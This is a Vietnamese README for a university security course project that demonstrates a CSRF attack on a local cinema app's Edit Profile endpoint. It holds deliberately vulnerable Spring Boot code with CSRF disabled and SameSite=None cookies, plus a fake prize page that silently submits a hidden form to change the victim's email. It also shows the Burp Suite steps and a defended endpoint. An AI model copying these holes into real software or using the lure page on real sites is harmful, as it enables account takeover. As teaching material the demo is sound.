# CSRF Attack Demo — Cinema Management Project

## Tổng quan

Đây là đồ án môn **An toàn bảo mật trong thương mại điện tử** (UIT).  
Demo tấn công CSRF nhắm vào trang **Edit Profile** (`/profile`) của ứng dụng rạp phim Cifastar.

---

## Tech Stack

- **Backend**: Spring Boot 3.x · Java · Spring Security · JWT (HS512)
- **Frontend Client**: Next.js 16 · port 3000
- **Attacker Site**: nginx static · port 4000
- **API Base**: `http://localhost:8080/api/theater-mgnt`

---

## Các file đã thay đổi

### 1. `backend/.../authentication/controller/AuthenticationController.java`
Login endpoint set JWT vào **httpOnly cookie** thay vì trả trong body:
```java
private void setAuthCookies(HttpServletResponse response, String jwtToken) {
    ResponseCookie jwtCookie = ResponseCookie.from("access_token", jwtToken)
        .httpOnly(true)
        .sameSite("None")   // ← None = browser gửi cross-site → CSRF attack surface
        .secure(false)      // ← false vì localhost HTTP
        .path("/")
        .maxAge(3600)
        .build();

    ResponseCookie csrfCookie = ResponseCookie.from("XSRF-TOKEN", generateCsrfToken())
        .httpOnly(false)    // ← JS đọc được để gửi lên header
        .sameSite("None")
        .secure(false)
        .path("/")
        .maxAge(3600)
        .build();

    response.addHeader("Set-Cookie", jwtCookie.toString());
    response.addHeader("Set-Cookie", csrfCookie.toString());
}
```

### 2. `backend/.../customer/controller/CustomerController.java`
Thêm 2 endpoint dùng `@RequestParam` (form-encoded) thay vì `@RequestBody` (JSON):
```java
// VULNERABLE — không có CSRF protection nào
@PostMapping("/myInfo/update-email-vuln")
ApiResponse<CustomerResponse> updateMyEmailVulnerable(@RequestParam String email) {
    return ApiResponse.<CustomerResponse>builder()
            .result(customerService.updateMyEmail(email))
            .build();
}

// DEFENDED — yêu cầu X-XSRF-TOKEN header + kiểm tra Origin
@PostMapping("/myInfo/update-email-defended")
ApiResponse<CustomerResponse> updateMyEmailDefended(
        @RequestParam String email,
        @RequestHeader("X-XSRF-TOKEN") String csrfHeader,
        @CookieValue("XSRF-TOKEN") String csrfCookie,
        HttpServletRequest httpRequest) {
    String origin = httpRequest.getHeader("Origin");
    if (origin == null || !origin.equals("http://localhost:3000"))
        throw new AppException(ErrorCode.UNAUTHORIZE);
    if (!csrfHeader.equals(csrfCookie))
        throw new AppException(ErrorCode.UNAUTHORIZE);
    return ApiResponse.<CustomerResponse>builder()
            .result(customerService.updateMyEmail(email))
            .build();
}
```

### 3. `backend/.../configuration/SecurityConfig.java`
CSRF bị tắt hoàn toàn (vulnerable state):
```java
httpSecurity.csrf(AbstractHttpConfigurer::disable);
```
Backend đọc JWT từ cả header lẫn cookie:
```java
@Bean
public BearerTokenResolver bearerTokenResolver() {
    DefaultBearerTokenResolver defaultResolver = new DefaultBearerTokenResolver();
    return request -> {
        String bearerToken = defaultResolver.resolve(request);
        if (bearerToken != null) return bearerToken;
        // Đọc từ cookie nếu không có Authorization header
        Cookie[] cookies = request.getCookies();
        if (cookies == null) return null;
        return Arrays.stream(cookies)
            .filter(c -> "access_token".equals(c.getName()))
            .map(Cookie::getValue)
            .findFirst()
            .map(v -> URLDecoder.decode(v, StandardCharsets.UTF_8))
            .orElse(null);
    };
}
```

### 4. `frontend/client/services/customerService.ts`
Gửi form-encoded (không phải JSON) để Burp Suite có thể intercept và thấy rõ:
```typescript
export const updateMyEmailForCsrfDemo = async (email: string, mode: DemoMode) => {
    const url = mode === "vulnerable" ? API.UPDATE_MY_EMAIL_VULN : API.UPDATE_MY_EMAIL_DEFENDED;
    const headers: Record<string, string> = {
        "Content-Type": "application/x-www-form-urlencoded",  // ← form-encoded
    };
    if (mode === "defended") {
        const csrfToken = document.cookie.split("; ")
            .find(row => row.startsWith("XSRF-TOKEN="))?.split("=")[1];
        if (csrfToken) headers["X-XSRF-TOKEN"] = decodeURIComponent(csrfToken);
    }
    const response = await httpClient.post(url, new URLSearchParams({ email }), { headers });
    return response.data.result;
};
```

### 5. `attacker/html/csrf-real-profile.html`
Trang giả mạo "trúng thưởng" — tấn công ngầm qua hidden iframe:
```html
<!-- iframe ẩn: form submit vào đây, nạn nhân không thấy gì -->
<iframe name="hidden-sink" style="display:none"></iframe>

<!-- Form tấn công — target vào iframe ẩn -->
<form id="csrf-form"
  action="http://localhost:8080/api/theater-mgnt/customers/myInfo/update-email-vuln"
  method="POST"
  target="hidden-sink"
  style="display:none">
  <input type="hidden" name="email" value="hacked@attacker.com" />
</form>

<script>
  window.addEventListener("load", function () {
    document.getElementById("csrf-form").submit(); // tấn công ngay khi load
  });
</script>
```
Sau khi tấn công xong, nút "Nhận voucher" redirect về `http://localhost:3000/profile`.

---

## Tại sao tấn công thành công

| Điều kiện | Trạng thái |
|---|---|
| JWT trong httpOnly cookie | ✅ browser tự gửi mọi request |
| Cookie `SameSite=None` | ✅ không chặn cross-site POST |
| CSRF disabled trong Spring | ✅ không kiểm tra token |
| Endpoint nhận `@RequestParam` | ✅ HTML form gửi được |

---

## Khởi động attacker site (port 4000)

**Cách 1 — Python (không cần Docker):**
```bash
python -m http.server 4000 --directory attacker/html
```

**Cách 2 — Docker:**
```bash
docker build -t csrf-attacker ./attacker
docker run -d -p 4000:80 --name csrf-attacker csrf-attacker
```

---

## Kịch bản demo với Burp Suite Community

### Chuẩn bị
```
Burp Suite: Proxy → Proxy settings → listener 127.0.0.1:8888
Browser: proxy → 127.0.0.1:8888 (Firefox: Settings → Network → Manual proxy)
```

### Bước 1 — Đăng nhập
- Bật **Intercept on**
- Vào `localhost:3000` → đăng nhập
- Burp bắt POST `/auth/customer/login` → click **Forward**
- Tắt **Intercept off**

### Bước 2 — Xem email hiện tại (trước tấn công)
- Vào `localhost:3000/profile`
- Thấy email ví dụ: `23521600@gm.uit.edu.vn`
- **Ghi nhớ email này để so sánh sau**

### Bước 3 — Bắt request Save (Vulnerable)
- Bật **Intercept on**
- Click **Edit Profile** → sửa email bất kỳ → click **Save (Vulnerable)**
- Burp bắt được:
```
POST /api/theater-mgnt/customers/myInfo/update-email-vuln
Origin: http://localhost:3000
Cookie: access_token=eyJ...
Content-Type: application/x-www-form-urlencoded

email=victim%40gmail.com
```
- Click **Forward** → email đổi bình thường
- Tắt **Intercept off**

### Bước 4 — Thực hiện tấn công
- Mở tab mới → `localhost:4000/csrf-real-profile.html`
- Trang "CinemaPlus — Chúc mừng trúng thưởng" hiện ra
- Form submit ngầm qua hidden iframe (nạn nhân không hay biết)
- Đợi ~3 giây → nút **"Nhận voucher ngay →"** hiện ra

### Bước 5 — Kiểm tra bằng chứng trong Burp
- Vào **Proxy → HTTP History**
- Thấy 2 request liền nhau đến cùng endpoint:

| Request | Origin | Cookie |
|---|---|---|
| Legitimate | `http://localhost:3000` | `access_token=eyJ...` |
| **ATTACK** | `http://localhost:4000` ← | `access_token=eyJ...` ← cùng cookie! |

→ **Đây là bằng chứng CSRF**: request từ origin khác nhưng mang cookie của victim.

### Bước 6 — Xác nhận kết quả
- Click **"Nhận voucher ngay"** → redirect về `localhost:3000/profile`
- Email đã bị đổi thành `hacked@attacker.com`

---

## Demo phòng thủ (để sau)

Khi muốn demo defense, chỉ cần đổi 1 dòng trong `AuthenticationController.java`:
```java
// Đổi từ:
.sameSite("None")
// Thành:
.sameSite("Strict")   // browser chặn hoàn toàn cross-site cookie
```

Hoặc dùng endpoint defended — attacker không thể thêm `X-XSRF-TOKEN` header từ HTML form:
```
POST /customers/myInfo/update-email-defended
→ 403 UNAUTHORIZED (thiếu X-XSRF-TOKEN header)
```
